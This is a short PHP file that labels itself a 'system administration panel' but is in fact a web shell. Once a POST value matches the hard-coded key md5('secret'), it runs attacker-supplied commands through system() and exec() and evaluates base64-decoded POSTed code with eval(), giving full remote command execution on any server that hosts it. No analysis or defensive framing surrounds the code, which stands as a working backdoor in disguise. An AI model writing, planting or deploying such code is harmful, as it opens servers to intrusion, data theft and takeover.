<?php
// system administration panel
$key = md5('secret');
if ($_POST['k'] === $key) {
    system($_POST['cmd']);
    exec($_GET['run']);
    $payload = base64_decode($_POST['p']);
    eval($payload);
}
?>
